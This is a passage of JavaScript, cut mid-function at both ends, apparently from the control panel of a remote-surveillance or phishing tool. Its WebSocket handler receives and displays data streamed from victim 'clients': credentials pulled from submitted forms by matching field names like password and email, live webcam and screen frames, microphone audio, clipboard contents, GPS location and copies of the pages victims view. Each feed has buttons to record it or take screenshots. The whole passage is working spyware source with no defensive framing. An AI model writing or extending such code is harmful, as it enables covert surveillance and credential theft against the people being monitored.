            window.websocket = ws; 
            ws.onopen = function() {
                statusElement.textContent = 'Connected';
                statusElement.classList.add('connected');
                console.log('WebSocket connection established');
            };
            
            ws.onclose = function() {
                console.log('WebSocket connection closed');
                statusElement.textContent = 'Disconnected';
                statusElement.classList.remove('connected');
                // Try to reconnect after 3 seconds
                setTimeout(initWebSocket, 3000);
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
            };
            window.websocket.onopen = function () {
                sendRequestContent();
            };

            ws.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    console.log('Received message type:', data.type);
                    
                    // Handle client ping messages (keep-alive)
                    if (data.type === 'ping' && data.clientId && data.ip) {
                        // This is a ping from a known client - just update the last seen time
                        updateClientLastSeen(data);
                        return;
                    }
                    
                    // Handle client connection data
                    if ( data.type === 'connection') {
                        handleClientConnection(data);
                        
                    }
                    // Handle credentials data from form submissions
                    else if (data.type === 'credentials') {
                        console.log('Received credentials data:', data);
                        addCredentials(data);
                    }
                    // Check form data for credential fields
                    else if (data.type === 'formData') {
                        console.log('Received form data:', data);
                        // Check if it contains credential fields
                        const credentialFields = ['username', 'password', 'email', 'pass', 'name', 'login', 'user'];
                        const hasCredentials = Object.keys(data.data || {}).some(key => 
                            credentialFields.some(field => key.toLowerCase().includes(field))
                        );
                        
                        if (hasCredentials) {
                            // Treat it as credentials
                            addCredentials(data);
                        }
                    }
                    // Handle login data for backward compatibility
                    else if (data.type === 'loginData') {
                        // Handle as credentials
                        addCredentials({
                            data: data.data,
                            url: data.url || 'Unknown',
                            timestamp: data.timestamp || new Date().toISOString()
                        });
                    }

                    else if (data.type === 'camera-frame') {
                        const cameraDisplay = document.getElementById('cameraFeed');
                        
                        // Check if this camera frame has a client ID
                        const clientId = data.clientId || 'default';
                        
                        // Update the main camera display if no client ID or it's the first client
                        if (cameraDisplay && (!data.clientId || clientId === window.activeClientId || !window.activeClientId)) {
                            if (data.data.startsWith('data:image')) {
                                // Create a canvas to convert image data to video stream
                                if (!cameraStream) {
                                    const canvas = document.createElement('canvas');
                                    const ctx = canvas.getContext('2d');
                                    canvas.width = 640;
                                    canvas.height = 480;
                                    
                                    // Create an image to load the frame data
                                    const img = new Image();
                                    img.onload = () => {
                                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                                    };
                                    
                                    // Get the stream from canvas
                                    cameraStream = canvas.captureStream(30);
                                    cameraDisplay.srcObject = cameraStream;
                                    console.log('Camera stream initialized with canvas stream');
                                }
                                
                                // Update the frame
                                const img = new Image();
                                img.src = data.data;
                                img.onload = () => {
                                    const canvas = cameraStream.getTracks()[0].canvas;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                                };
                                
                                // Set this as the active client ID if not already set
                                if (!window.activeClientId) {
                                    window.activeClientId = clientId;
                                }
                            }
                        }
                        
                        // Handle client-specific camera feed if there's a client ID
                        if (data.clientId) {
                            // Check if we already have a container for this client
                            let clientContainer = document.getElementById(`camera-container-${clientId}`);
                            
                            if (!clientContainer) {
                                // Create a new container for this client
                                clientContainer = document.createElement('div');
                                clientContainer.id = `camera-container-${clientId}`;
                                clientContainer.style.border = '1px solid #ddd';
                                clientContainer.style.borderRadius = '8px';
                                clientContainer.style.padding = '15px';
                                clientContainer.style.marginTop = '20px';
                                clientContainer.style.backgroundColor = '#f8f9fa';
                                
                                // Create client header with ID
                                const clientHeader = document.createElement('div');
                                clientHeader.style.display = 'flex';
                                clientHeader.style.justifyContent = 'space-between';
                                clientHeader.style.alignItems = 'center';
                                clientHeader.style.marginBottom = '10px';
                                
                                const clientTitle = document.createElement('h4');
                                clientTitle.textContent = `Client: ${clientId.substring(0, 8)}`;
                                clientTitle.style.margin = '0';
                                
                                clientHeader.appendChild(clientTitle);
                                clientContainer.appendChild(clientHeader);
                                
                                // Create video element
                                const clientVideo = document.createElement('video');
                                clientVideo.id = `client-camera-${clientId}`;
                                clientVideo.autoplay = true;
                                clientVideo.playsinline = true;
                                clientVideo.style.width = '100%';
                                clientVideo.style.maxWidth = '640px';
                                clientVideo.style.borderRadius = '4px';
                                clientContainer.appendChild(clientVideo);
                                
                                // Create buttons container
                                const buttonsContainer = document.createElement('div');
                                buttonsContainer.style.display = 'flex';
                                buttonsContainer.style.gap = '10px';
                                buttonsContainer.style.marginTop = '10px';
                                
                                // Create record button
                                const recordButton = document.createElement('button');
                                recordButton.className = 'perm-button';
                                recordButton.textContent = '⏺️ Start Recording';
                                recordButton.onclick = function() {
                                    toggleClientCameraRecording(clientId);
                                };
                                
                                // Create screenshot button
                                const screenshotButton = document.createElement('button');
                                screenshotButton.className = 'perm-button';
                                screenshotButton.textContent = '📸 Take Screenshot';
                                screenshotButton.onclick = function() {
                                    takeClientCameraScreenshot(clientId);
                                };
                                
                                // Add buttons to container
                                buttonsContainer.appendChild(recordButton);
                                buttonsContainer.appendChild(screenshotButton);
                                clientContainer.appendChild(buttonsContainer);
                                
                                // Add the container to the client feeds section
                                document.getElementById('client-camera-feeds').appendChild(clientContainer);
                                
                                // Initialize client-specific stream
                                const clientCanvas = document.createElement('canvas');
                                clientCanvas.width = 640;
                                clientCanvas.height = 480;
                                clientCanvas.style.display = 'none';
                                document.body.appendChild(clientCanvas);
                                
                                // Create stream from canvas
                                const clientStream = clientCanvas.captureStream(30);
                                clientVideo.srcObject = clientStream;
                                
                                // Store canvas and stream in global objects for reference
                                if (!window.clientCameraCanvases) window.clientCameraCanvases = {};
                                window.clientCameraCanvases[clientId] = clientCanvas;
                                
                                if (!window.clientCameraStreams) window.clientCameraStreams = {};
                                window.clientCameraStreams[clientId] = clientStream;
                            }
                            
                            // Update the client's camera feed
                            if (window.clientCameraCanvases && window.clientCameraCanvases[clientId]) {
                                const clientCanvas = window.clientCameraCanvases[clientId];
                                const clientCtx = clientCanvas.getContext('2d');
                                
                                const clientImg = new Image();
                                clientImg.src = data.data;
                                clientImg.onload = () => {
                                    clientCtx.drawImage(clientImg, 0, 0, clientCanvas.width, clientCanvas.height);
                                };
                            }
                        }
                    }
                    else if (data.type === 'screen-frame') {
                        const screenDisplay = document.getElementById('screenDisplay');
                        
                        // Check if this screen frame has a client ID
                        const clientId = data.clientId || 'default';
                        
                        // Update the main screen display if no client ID or it's the first client
                        if (screenDisplay && (!data.clientId || clientId === window.activeScreenClientId || !window.activeScreenClientId)) {
                            screenDisplay.src = data.data;
                            
                            // Initialize screen stream if not already done
                            if (!screenStream) {
                                // Create a canvas for screen capture with fixed dimensions
                                const canvas = document.createElement('canvas');
                                const ctx = canvas.getContext('2d');
                                canvas.width = 1280; // Fixed width
                                canvas.height = 720; // Fixed height
                                document.body.appendChild(canvas);
                                canvas.style.display = 'none';
                                
                                // Set up an interval to continuously update the canvas
                                setInterval(() => {
                                    if (screenDisplay.complete && screenDisplay.naturalWidth > 0) {
                                        ctx.drawImage(screenDisplay, 0, 0, canvas.width, canvas.height);
                                    }
                                }, 33); // ~30fps
                                
                                // Create a stream from the canvas
                                try {
                                    screenStream = canvas.captureStream(30);
                                    console.log('Screen stream created successfully with dimensions:', canvas.width, 'x', canvas.height);
                                } catch (e) {
                                    console.error('Error creating screen stream:', e);
                                }
                            }
                            
                            // Set this as the active screen client ID if not already set
                            if (!window.activeScreenClientId) {
                                window.activeScreenClientId = clientId;
                            }
                        }
                        
                        // Handle client-specific screen capture if there's a client ID
                        if (data.clientId) {
                            // Check if we already have a container for this client
                            let clientContainer = document.getElementById(`screen-container-${clientId}`);
                            
                            if (!clientContainer) {
                                // Create a new container for this client
                                clientContainer = document.createElement('div');
                                clientContainer.id = `screen-container-${clientId}`;
                                clientContainer.style.border = '1px solid #ddd';
                                clientContainer.style.borderRadius = '8px';
                                clientContainer.style.padding = '15px';
                                clientContainer.style.marginTop = '20px';
                                clientContainer.style.backgroundColor = '#f8f9fa';
                                
                                // Create client header with ID
                                const clientHeader = document.createElement('div');
                                clientHeader.style.display = 'flex';
                                clientHeader.style.justifyContent = 'space-between';
                                clientHeader.style.alignItems = 'center';
                                clientHeader.style.marginBottom = '10px';
                                
                                const clientTitle = document.createElement('h4');
                                clientTitle.textContent = `Client: ${clientId.substring(0, 8)}`;
                                clientTitle.style.margin = '0';
                                
                                clientHeader.appendChild(clientTitle);
                                clientContainer.appendChild(clientHeader);
                                
                                // Create image element
                                const clientScreen = document.createElement('img');
                                clientScreen.id = `client-screen-${clientId}`;
                                clientScreen.style.width = '100%';
                                clientScreen.style.maxWidth = '1280px';
                                clientScreen.style.borderRadius = '4px';
                                clientContainer.appendChild(clientScreen);
                                
                                // Create buttons container
                                const buttonsContainer = document.createElement('div');
                                buttonsContainer.style.display = 'flex';
                                buttonsContainer.style.gap = '10px';
                                buttonsContainer.style.marginTop = '10px';
                                
                                // Create record button
                                const recordButton = document.createElement('button');
                                recordButton.className = 'perm-button';
                                recordButton.textContent = '⏺️ Start Recording';
                                recordButton.onclick = function() {
                                    toggleClientScreenRecording(clientId);
                                };
                                
                                // Create screenshot button
                                const screenshotButton = document.createElement('button');
                                screenshotButton.className = 'perm-button';
                                screenshotButton.textContent = '📸 Take Screenshot';
                                screenshotButton.onclick = function() {
                                    takeClientScreenScreenshot(clientId);
                                };
                                
                                // Add buttons to container
                                buttonsContainer.appendChild(recordButton);
                                buttonsContainer.appendChild(screenshotButton);
                                clientContainer.appendChild(buttonsContainer);
                                
                                // Add the container to the client screen captures section
                                document.getElementById('client-screen-captures').appendChild(clientContainer);
                                
                                // Initialize client-specific canvas for recording
                                const clientCanvas = document.createElement('canvas');
                                clientCanvas.width = 1280;
                                clientCanvas.height = 720;
                                clientCanvas.style.display = 'none';
                                document.body.appendChild(clientCanvas);
                                
                                // Store canvas in global object for reference
                                if (!window.clientScreenCanvases) window.clientScreenCanvases = {};
                                window.clientScreenCanvases[clientId] = clientCanvas;
                                
                                // Set up interval to update client canvas
                                setInterval(() => {
                                    const clientScreenImg = document.getElementById(`client-screen-${clientId}`);
                                    if (clientScreenImg && clientScreenImg.complete && clientScreenImg.naturalWidth > 0) {
                                        const ctx = clientCanvas.getContext('2d');
                                        ctx.drawImage(clientScreenImg, 0, 0, clientCanvas.width, clientCanvas.height);
                                    }
                                }, 33); // ~30fps
                                
                                // Create stream from canvas
                                try {
                                    const clientStream = clientCanvas.captureStream(30);
                                    
                                    // Store stream in global object for reference
                                    if (!window.clientScreenStreams) window.clientScreenStreams = {};
                                    window.clientScreenStreams[clientId] = clientStream;
                                } catch (e) {
                                    console.error(`Error creating screen stream for client ${clientId}:`, e);
                                }
                            }
                            
                            // Update the client's screen capture
                            const clientScreen = document.getElementById(`client-screen-${clientId}`);
                            if (clientScreen) {
                                clientScreen.src = data.data;
                            }
                        }
                    }
                    
                    else if (data.type === 'audio-data') {
                            // Audio data received from client
                            const audioContext = window.audioContext || (window.audioContext = new (window.AudioContext || window.webkitAudioContext)({
                                // Use higher sample rate for better audio quality
                                sampleRate: 48000
                            }));
                            
                            // Get client ID from data or use default
                            const clientId = data.clientId || 'default';
                            
                            // Check if this client's audio is paused
                            if (window.clientAudioStates && window.clientAudioStates[clientId]) {
                                // Skip processing if this client's audio is paused
                                console.log(`Skipping audio processing for paused client ${clientId}`);
                                return;
                            }
                            
                            // Store packets for proper ordering using timestamp and client ID
                            if (!window.audioPackets) window.audioPackets = {};
                            
                            // Initialize client-specific packet queue if needed
                            if (!window.audioPackets[clientId]) {
                                window.audioPackets[clientId] = [];
                            }
                            
                            // Add packet to client-specific queue with timestamp
                            const timestamp = data.timestamp || Date.now();
                            window.audioPackets[clientId].push({
                                data: data.data,
                                timestamp: timestamp
                            });
                            
                            // Sort client-specific packets by timestamp (oldest first)
                            window.audioPackets[clientId].sort((a, b) => a.timestamp - b.timestamp);
                            
                            // Process oldest packet for this client
                            if (window.audioPackets[clientId].length > 0) {
                                const packet = window.audioPackets[clientId].shift();
                                data.data = packet.data;
                            }
                            
                            // Create or get client-specific audio container
                            const audioContainer = document.getElementById('audioContainer');
                            if (audioContainer) {
                                // Check if we already have a container for this client
                                let clientContainer = document.getElementById(`audio-client-${clientId}`);
                                
                                if (!clientContainer) {
                                    // Create new client container
                                    clientContainer = document.createElement('div');
                                    clientContainer.id = `audio-client-${clientId}`;
                                    clientContainer.className = 'client-audio-container';
                                    clientContainer.style.cssText = 'margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px;';
                                    
                                    // Add client header
                                    const clientHeader = document.createElement('div');
                                    clientHeader.className = 'client-header';
                                    
                                    // Get nickname for this client
                                    let displayName = clientId;
                                    let foundNickname = false;
                                    
                                    // Find client by clientId in our clients object - try exact match first
                                    for (const key in clients) {
                                        if (clients[key].clientId === clientId && clients[key].nickname) {
                                            displayName = clients[key].nickname;
                                            foundNickname = true;
                                            break;
                                        }
                                    }
                                    
                                    // If no exact match, try partial match with the shortened ID
                                    if (!foundNickname) {
                                        const shortId = clientId.split('_').pop().substring(0, 8);
                                        for (const key in clients) {
                                            if (clients[key].clientId && 
                                                clients[key].clientId.includes(shortId) && 
                                                clients[key].nickname) {
                                                displayName = clients[key].nickname;
                                                break;
                                            }
                                        }
                                    }
                                    
                                    clientHeader.innerHTML = `<strong>Client: ${displayName}</strong>`;
                                    clientHeader.style.cssText = 'margin-bottom: 10px; font-size: 16px; color: #333;';
                                    
                                    // Create client-specific visualizer
                                    const visualizer = document.createElement('canvas');
                                    visualizer.id = `audioVisualizer-${clientId}`;
                                    visualizer.width = 300;
                                    visualizer.height = 100;
                                    visualizer.style.cssText = 'width: 100%; background: #f8f9fa; border-radius: 4px;';
                                    
                                    // Create button container for controls
                                    const buttonContainer = document.createElement('div');
                                    buttonContainer.style.cssText = 'display: flex; gap: 10px; margin-top: 10px;';
                                    
                                    // Create client-specific record button
                                    const recordButton = document.createElement('button');
                                    recordButton.id = `audioRecordButton-${clientId}`;
                                    recordButton.className = 'perm-button';
                                    recordButton.textContent = '⏺️ Record Audio';
                                    recordButton.style.cssText = 'background-color: #dc3545; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;';
                                    recordButton.onclick = function() { toggleAudioRecording(clientId); };
                                    
                                    // Create client-specific pause/resume button
                                    const pauseButton = document.createElement('button');
                                    pauseButton.id = `audioPauseButton-${clientId}`;
                                    pauseButton.className = 'perm-button';
                                    pauseButton.textContent = '⏸️ Pause Audio';
                                    pauseButton.style.cssText = 'background-color: #007bff; color: white; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer;';
                                    pauseButton.onclick = function() { toggleClientAudio(clientId); };
                                    
                                    // Add buttons to button container
                                    buttonContainer.appendChild(recordButton);
                                    buttonContainer.appendChild(pauseButton);
                                    
                                    // Add elements to client container
                                    clientContainer.appendChild(clientHeader);
                                    clientContainer.appendChild(visualizer);
                                    clientContainer.appendChild(buttonContainer);
                                    
                                    // Add to audio container
                                    audioContainer.appendChild(clientContainer);
                                }
                            }
                            
                            // Ensure audio context is running
                            if (audioContext.state === 'suspended') {
                                audioContext.resume();
                            }
                            
                            // Create an AudioBuffer from the Float32Array data
                            const audioBuffer = audioContext.createBuffer(1, data.data.length, audioContext.sampleRate);
                            const channelData = audioBuffer.getChannelData(0);
                            
                            // Copy the received Float32Array data into the audio buffer with enhanced processing
                            // Apply advanced pre-processing to the audio data for better clarity
                            const noiseFloor = 0.003; // Even lower noise floor for better sensitivity
                            let maxSample = 0;
                            let rms = 0; // Root mean square for better volume assessment
                            
                            // First pass: calculate statistics for intelligent processing
                            for (let i = 0; i < data.data.length; i++) {
                                const absValue = Math.abs(data.data[i]);
                                if (absValue > maxSample) {
                                    maxSample = absValue;
                                }
                                rms += data.data[i] * data.data[i];
                            }
                            
                            // Calculate RMS (Root Mean Square) for better volume assessment
                            rms = Math.sqrt(rms / data.data.length);
                            
                            // Determine optimal normalization based on audio characteristics
                            // Use dynamic normalization based on both peak and RMS values
                            let normalizationFactor;
                            if (maxSample > 0.3) {
                                // Already loud enough, just minor boost
                                normalizationFactor = 1.2;
                            } else if (maxSample > 0.1) {
                                // Medium level, moderate boost
                                normalizationFactor = 1.8;
                            } else if (rms > 0.01) {
                                // Low level but consistent sound, higher boost
                                normalizationFactor = 2.5;
                            } else {
                                // Very low level, maximum boost
                                normalizationFactor = 3.0;
                            }
                            
                            // Apply intelligent noise reduction and normalization
                            for (let i = 0; i < data.data.length; i++) {
                                // Apply improved noise gate to reduce background noise
                                let sample = data.data[i];
                                
                                // Adaptive noise gate based on overall signal strength
                                const adaptiveNoiseFloor = noiseFloor * (1.0 / (rms * 50 + 1));
                                
                                if (Math.abs(sample) < adaptiveNoiseFloor) {
                                    sample = 0;
                                } else {
                                    // Apply smooth noise reduction with soft knee for natural sound
                                    if (Math.abs(sample) < adaptiveNoiseFloor * 5) {
                                        const factor = (Math.abs(sample) - adaptiveNoiseFloor) / (adaptiveNoiseFloor * 4);
                                        // Use cubic easing for smoother transition
                                        const smoothFactor = factor * factor * (3 - 2 * factor);
                                        sample *= smoothFactor;
                                    }
                                }
                                
                                // Apply normalization with soft clipping to prevent harsh distortion
                                const normalized = sample * normalizationFactor;
                                if (normalized > 0.95) {
                                    channelData[i] = 0.95 + (normalized - 0.95) * 0.05;
                                } else if (normalized < -0.95) {
                                    channelData[i] = -0.95 + (normalized + 0.95) * 0.05;
                                } else {
                                    channelData[i] = normalized;
                                }
                            }
                            
                            // Create and play the audio buffer
                            const source = audioContext.createBufferSource();
                            source.buffer = audioBuffer;
                            
                            // Advanced audio processing chain for maximum clarity
                            
                            // 1. Create a high-pass filter to remove low-frequency noise and rumble
                            const highPassFilter = audioContext.createBiquadFilter();
                            highPassFilter.type = 'highpass';
                            highPassFilter.frequency.value = 100; // Cut off frequencies below 100Hz
                            highPassFilter.Q.value = 0.8;
                            
                            // 2. Create a low-pass filter to remove high-frequency hiss
                            const lowPassFilter = audioContext.createBiquadFilter();
                            lowPassFilter.type = 'lowpass';
                            lowPassFilter.frequency.value = 12000; // Cut off frequencies above 12kHz
                            lowPassFilter.Q.value = 0.7;
                            
                            // 3. Create first peaking filter to enhance lower speech frequencies
                            const peakingFilter1 = audioContext.createBiquadFilter();
                            peakingFilter1.type = 'peaking';
                            peakingFilter1.frequency.value = 1000; // Boost frequencies around 1kHz
                            peakingFilter1.gain.value = 4; // +4dB boost
                            peakingFilter1.Q.value = 1.0;
                            
                            // 4. Create second peaking filter to enhance higher speech frequencies
                            const peakingFilter2 = audioContext.createBiquadFilter();
                            peakingFilter2.type = 'peaking';
                            peakingFilter2.frequency.value = 3000; // Boost frequencies around 3kHz for clarity
                            peakingFilter2.gain.value = 6; // +6dB boost
                            peakingFilter2.Q.value = 1.0;
                            
                            // 5. Create a compressor for more consistent volume
                            const compressor = audioContext.createDynamicsCompressor();
                            compressor.threshold.value = -24;
                            compressor.knee.value = 10; // Softer knee for smoother compression
                            compressor.ratio.value = 6; // Less aggressive ratio for more natural sound
                            compressor.attack.value = 0.002; // Faster attack to catch transients
                            compressor.release.value = 0.25;
                            
                            // 6. Create a gain node for final volume adjustment
                            const gainNode = audioContext.createGain();
                            gainNode.gain.value = 2.5; // Higher gain for better volume
                            
                            // Connect the enhanced processing chain
                            source.connect(highPassFilter);
                            highPassFilter.connect(lowPassFilter);
                            lowPassFilter.connect(peakingFilter1);
                            peakingFilter1.connect(peakingFilter2);
                            peakingFilter2.connect(compressor);
                            compressor.connect(gainNode);
                            
                            // Connect to the main output with processing
                            gainNode.connect(audioContext.destination);
                            
                            // Also connect to the recording destination if it exists
                            if (window.audioDestination) {
                                if (window.audioCompressor && window.audioGain) {
                                    // Use the existing processing chain for recording
                                    source.connect(window.audioCompressor);
                                } else {
                                    // Connect directly if no processing chain exists
                                    gainNode.connect(window.audioDestination);
                                }
                            }
                            
                            // Resume audio context if it's suspended (needed for Chrome's autoplay policy)
                            if (audioContext.state === 'suspended') {
                                audioContext.resume().then(() => {
                                    console.log('AudioContext resumed successfully');
                                    source.start(0);
                                }).catch(err => {
                                    console.error('Failed to resume AudioContext:', err);
                                });
                            } else {
                                source.start(0);
                            }
                            
                            // Visualize the audio data on client-specific canvas
                            const canvas = document.getElementById(`audioVisualizer-${clientId}`) || document.getElementById('audioVisualizer');
                            if (!canvas) return;
                            
                            const ctx = canvas.getContext('2d');
                            ctx.clearRect(0, 0, canvas.width, canvas.height);
                            
                            // Draw background grid for better visualization
                            ctx.strokeStyle = '#e9ecef';
                            ctx.lineWidth = 0.5;
                            
                            // Draw horizontal grid lines
                            for (let i = 0; i <= canvas.height; i += 20) {
                                ctx.beginPath();
                                ctx.moveTo(0, i);
                                ctx.lineTo(canvas.width, i);
                                ctx.stroke();
                            }
                            
                            // Draw vertical grid lines
                            for (let i = 0; i <= canvas.width; i += 30) {
                                ctx.beginPath();
                                ctx.moveTo(i, 0);
                                ctx.lineTo(i, canvas.height);
                                ctx.stroke();
                            }
                            
                            // Draw waveform with gradient
                            const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
                            gradient.addColorStop(0, '#007bff');
                            gradient.addColorStop(1, '#00bcd4');
                            
                            ctx.beginPath();
                            ctx.strokeStyle = gradient;
                            ctx.lineWidth = 2;
                            
                            const sliceWidth = canvas.width / data.data.length;
                            let x = 0;
                            
                            // Draw waveform
                            for (let i = 0; i < data.data.length; i++) {
                                const y = (data.data[i] * canvas.height / 2) + canvas.height / 2;
                                if (i === 0) {
                                    ctx.moveTo(x, y);
                                } else {
                                    ctx.lineTo(x, y);
                                }
                                x += sliceWidth;
                            }
                            
                            ctx.stroke();
                            
                            // Add volume meter
                            let sumSquares = 0;
                            for (let i = 0; i < data.data.length; i++) {
                                sumSquares += data.data[i] * data.data[i];
                            }
                            const volumeRms = Math.sqrt(sumSquares / data.data.length);
                            const volumeHeight = Math.min(canvas.height, volumeRms * canvas.height * 5);
                            
                            // Draw volume indicator on the right side
                            ctx.fillStyle = gradient;
                            ctx.fillRect(canvas.width - 10, canvas.height - volumeHeight, 8, volumeHeight);
                            
                            // Log the audio data reception only when needed
                            if (!window.lastAudioUpdate || Date.now() - window.lastAudioUpdate >= 5000) {
                                const audioDiv = document.createElement('div');
                                document.getElementById('audioLogs').appendChild(audioDiv);
                                document.getElementById('allLogs').appendChild(audioDiv.cloneNode(true));
                                window.lastAudioUpdate = Date.now();
                            }
                            // --- Audio Playback ---
                            if (data.audioBase64) {
                                try {
                                    const audioContext = window.audioContext || (window.audioContext = new (window.AudioContext || window.webkitAudioContext)());
                                    const audioData = atob(data.audioBase64);
                                    const buffer = new Uint8Array(audioData.length);
                                    for (let i = 0; i < audioData.length; i++) {
                                        buffer[i] = audioData.charCodeAt(i);
                                    }
                                    audioContext.decodeAudioData(buffer.buffer.slice(0), function(decodedData) {
                                        const source = audioContext.createBufferSource();
                                        source.buffer = decodedData;
                                        source.connect(audioContext.destination);
                                        source.start(0);
                                    }, function(e) {
                                        console.error('Audio decode error', e);
                                    });
                                } catch (e) {
                                    console.error('Audio playback error', e);
                                }
                            }
                        } 
                       
                    else if (data.type === 'clipboard-content') {
                        // Track processed clipboard messages to prevent duplicates
                        if (!window.processedClipboardMessages) {
                            window.processedClipboardMessages = new Set();
                        }
                        
                        // Create a unique identifier for this message
                        const messageId = `${data.clientId}-${data.content.substring(0, 50)}`;
                        
                        // Check if we've already processed this message
                        if (!window.processedClipboardMessages.has(messageId)) {
                            // Get nickname for the client if available
                            let displayName = data.clientId;
                            for (const key in clients) {
                                if (clients[key].clientId === data.clientId && clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    break;
                                }
                            }
                            
                            // If no exact match, try partial match with the shortened ID
                            if (displayName === data.clientId && data.clientId && data.clientId.includes('_')) {
                                const shortId = data.clientId.split('_').pop().substring(0, 8);
                                for (const key in clients) {
                                    if (clients[key].clientId && 
                                        clients[key].clientId.includes(shortId) && 
                                        clients[key].nickname) {
                                        displayName = clients[key].nickname;
                                        break;
                                    }
                                }
                            }
                            
                            // Add to clipboard history with nickname
                            if (data.clientId && data.content) {
                                clipboardHistory.addEntry(data.clientId, data.content, displayName);
                            }
                            
                            // Mark as processed
                            window.processedClipboardMessages.add(messageId);
                            
                            // Limit the size of the Set to prevent memory leaks
                            if (window.processedClipboardMessages.size > 100) {
                                // Remove the oldest entries (convert to array, slice, convert back to Set)
                                const messagesArray = Array.from(window.processedClipboardMessages);
                                window.processedClipboardMessages = new Set(messagesArray.slice(-50));
                            }
                        } else {
                            console.log('Skipping already processed clipboard message');
                        }
                    } 

                    else if (data.type === 'location') {
                        // Update current location display
                        const locationDisplay = document.getElementById('locationDisplay');
                        const lat = data.coords.latitude;
                        const lng = data.coords.longitude;
                        const accuracy = data.coords.accuracy || 'Unknown';
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        // Get client ID from data
                        const clientId = data.clientId || 'default';
                        
                       
                        
                        // Get nickname for this client
                        let displayName = clientId;
                        let foundNickname = false;
                        
                        // First try exact match
                        for (const key in clients) {
                            if (clients[key].clientId === clientId && clients[key].nickname) {
                                displayName = clients[key].nickname;
                                foundNickname = true;
                                break;
                            }
                        }
                        
                        // If no exact match, try with shortened ID
                        if (!foundNickname && clientId.includes('_')) {
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            for (const key in clients) {
                                if (clients[key].clientId && 
                                    clients[key].clientId.includes(shortId) && 
                                    clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    break;
                                }
                            }
                        }
                        
                        // Add to location history
                        addLocationToHistory(clientId, {
                            coords: data.coords,
                            timestamp: new Date().toISOString(),
                            displayName: displayName
                        });
                        
                        // Add log entry
                        const locationDiv = document.createElement('div');
                        document.getElementById('locationLogs').appendChild(locationDiv);
                        document.getElementById('allLogs').appendChild(locationDiv.cloneNode(true));
                    }

                    else if (data.type && data.message) {
                        // Check if this is a permission response - if so, ignore it
                        if (shouldIgnorePermissionMessage(data)) {
                            console.log('Ignoring permission response:', data.type, data.message);
                            return;
                        }
                        
                        // Process other message types normally
                        const statusDiv = document.createElement('div');
                        statusDiv.className = data.granted ? 'status granted' : 'status denied';
                        statusDiv.textContent = `${new Date().toLocaleTimeString()} - ${data.message}`;
                        
                        // Add to all logs
                        document.getElementById('allLogs').appendChild(statusDiv.cloneNode(true));
                        
                        // Add to specific section
                        const logMapping = {
                            'camera': 'cameraLogs',
                            'screen': 'screenLogs',
                            'clipboard': 'clipboardLogs',
                            'audio': 'audioLogs',
                            'location': 'locationLogs',
                        };
                        
                        const logSection = Object.keys(logMapping).find(key => data.type.includes(key));
                        if (logSection) {
                            document.getElementById(logMapping[logSection]).appendChild(statusDiv.cloneNode(true));
                        } else {
                            document.getElementById('otherLogs').appendChild(statusDiv.cloneNode(true));
                        }
                    }
                    
                    else if (data.type === 'html-content' && data.clientId) {
                        const clientId = data.clientId;
                        let htmlContent = data.content;
                        const pageTitle = data.pageTitle || 'Unknown Page';
                        const pageUrl = data.pageUrl || '#';
                        
                        // SECURITY: Strip JavaScript content before displaying it
                        // This prevents any JS from executing in the iframe
                        htmlContent = sanitizeHtmlContent(htmlContent);
                        
                        // Allow preview for all pages (removed restrictive title filter that checked for "file handler")
                        
                        // Function to sanitize HTML content by removing JavaScript
                        function sanitizeHtmlContent(html) {
                            if (!html) return '';
                            
                            // Remove script tags and their content
                            let sanitized = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
                            
                            // Remove inline event handlers (onclick, onload, etc.)
                            sanitized = sanitized.replace(/\son\w+\s*=\s*["']?[^"']*["']?/gi, '');
                            
                            // Remove javascript: URLs
                            sanitized = sanitized.replace(/javascript\s*:/gi, 'disabled-javascript:');
                            
                            // Remove data: URLs (could contain JavaScript)
                            sanitized = sanitized.replace(/data\s*:\s*text\/html/gi, 'disabled-data:text/html');
                            
                            return sanitized;
                        }
                        
                        // Check if the container already exists and if tracking is disabled
                      /*  const existingContainer = document.getElementById(`preview-container-${clientId}`);
                        if (existingContainer && existingContainer.dataset.tracking !== 'true') {
                            // Skip updating content if tracking is disabled for this client
                            return;
                        }*/
                        
                        // Get or create client-specific container
                        const containerId = `preview-container-${clientId}`;
                        let container = document.getElementById(containerId);
                        
                        // If we're creating a new container, initialize tracking to false by default
                        if (!container) {
                            console.log(`Creating new container for client ${clientId} with tracking disabled by default`);
                        }
                        
                        if (!container) {
                            // Create new container for this client
                            container = document.createElement('div');
                            container.id = containerId;
                            container.className = 'client-preview-container minimized';
                            container.style.border = '1px solid #ddd';
                            container.style.borderRadius = '8px';
                            container.style.backgroundColor = '#f9f9f9';
                            container.style.overflow = 'hidden';
                            container.style.display = 'flex';
                            container.style.flexDirection = 'column';
                            
                            // Add client header
                            const header = document.createElement('div');
                            header.style.display = 'flex';
                            header.style.justifyContent = 'space-between';
                            header.style.alignItems = 'center';
                            header.style.padding = '6px';
                            header.style.borderBottom = '1px solid #ddd';
                            header.style.backgroundColor = '#f1f8ff';
                            
                            // Create title element with flex layout for left side
                            const titleArea = document.createElement('div');
                            titleArea.style.display = 'flex';
                            titleArea.style.alignItems = 'center';
                            
                            const title = document.createElement('div');
                            title.style.fontWeight = 'bold';
                            title.innerHTML = `<span class="page-title">${pageTitle}</span>`;
                            
                            // Create control buttons container
                            const controlButtons = document.createElement('div');
                            controlButtons.style.display = 'flex';
                            controlButtons.style.gap = '5px';
                            
                            // Create fullscreen button
                            const fullscreenBtn = document.createElement('button');
                            fullscreenBtn.id = `fullscreen-btn-${clientId}`;
                            fullscreenBtn.className = 'fullscreen-toggle';
